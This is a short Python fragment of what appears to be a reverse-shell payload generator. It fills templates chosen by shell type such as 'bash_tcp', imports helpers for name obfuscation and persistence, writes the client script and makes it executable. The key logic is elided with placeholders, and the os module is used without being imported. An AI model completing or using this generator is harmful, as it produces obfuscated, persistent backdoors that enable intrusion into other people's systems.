from .utilities import generate_random_string, generate_obfuscated_name, get_persistence_code
from .templates import PAYLOAD_TEMPLATES

def generate_client(config):
    template = PAYLOAD_TEMPLATES.get(config["shell_type"])
    if not template:
        raise ValueError(f"Unsupported shell type: {config['shell_type']}")

    # Generate obfuscated names
    obf_names = {
        # ... (generate all obf names)
    }

    # Generate script content
    script_content = template.format(
        # ... (format with config and obf_names)
    )

    output_file = config["output_file"]
    with open(output_file, "w") as f:
        f.write(script_content)

    if config["shell_type"] == "bash_tcp":
        os.chmod(output_file, 0o755)

    print(f"[*] Generated client: {output_file}")
